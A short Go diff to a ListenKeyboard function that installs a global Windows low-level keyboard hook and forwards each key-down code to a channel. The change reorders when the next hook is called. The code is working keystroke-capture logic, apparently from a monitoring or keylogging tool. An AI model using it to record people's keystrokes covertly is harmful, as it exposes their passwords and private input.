@@ -119,11 +119,12 @@ func (t *target) ListenKeyboard(channel chan byte) {
 	var keyboardHook HHOOK
 
 	keyboardHook = setWindowsHookEx(whKeyboardLL, func(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
+		next := callNextHookEx(keyboardHook, nCode, wParam, lParam)
 		if nCode == 0 && wParam == wmKeyDown {
 			structure := (*kbDllHookStruct)(unsafe.Pointer(lParam))
 			channel <- byte(structure.VkCode)
 		}
-		return callNextHookEx(keyboardHook, nCode, wParam, lParam)
+		return next
 	}, 0, 0)
 
 	var msg MSG
